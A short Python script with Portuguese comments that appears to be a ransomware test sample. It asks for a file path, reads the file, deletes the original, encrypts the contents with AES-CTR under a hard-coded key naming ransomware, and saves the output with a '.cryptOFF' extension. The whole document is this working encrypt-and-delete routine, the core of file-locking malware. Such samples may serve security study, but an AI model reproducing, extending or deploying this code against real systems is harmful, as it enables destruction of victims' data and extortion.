import os
import pyaes

# Solicita o caminho do arquivo
file_name = input("Digite o caminho do arquivo a ser criptografado ").strip()

if not os.path.exists(file_name):
    print("Erro: O arquivo específico não foi encontrado")

else:
    try:
        # Abrir e ler o arquivo
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original da pasta
        os.remove(file_name)

        # Chave de criptografia com 32 bytes
        key = b"testeransomwares_security_crypt!"

        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvando o arquivo criptografado
        encrypted_file_name = file_name + ".cryptOFF"
        with open(encrypted_file_name, "wb") as new_file:
            new_file.write(crypto_data)

    except Exception as e:
        print(f"Erro ao processar o arquivo: {e}")
